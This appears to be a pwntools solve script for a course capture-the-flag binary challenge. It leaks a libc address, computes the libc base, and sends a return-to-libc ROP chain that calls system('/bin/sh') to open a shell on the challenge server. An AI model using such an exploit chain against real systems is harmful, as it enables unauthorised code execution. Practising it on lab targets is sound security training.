from pwn import *

binary = "jigsaw.bin_patched"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = ELF('libc-2.31.so')

gs = '''
break main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-bin3.chals.io", 443, ssl=True, sni="cse4850-bin3.chals.io")
    return process(e.path)

p = start()

p.sendlineafter(b'Bear Trap', b'2')
p.sendlineafter(b'Jelly Trap', b'1')
p.sendlineafter(b'Helix Trap', b'1')

p.recvuntil(b'here: 0x')
leak = int(p.recvline().decode('utf-8').strip(), 16)
libc.address = leak - libc.sym['puts']

r = ROP(libc)
payload = cyclic(16)
payload += p64(r.find_gadget(['ret'])[0])
payload += p64(r.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendline(payload)

p.interactive()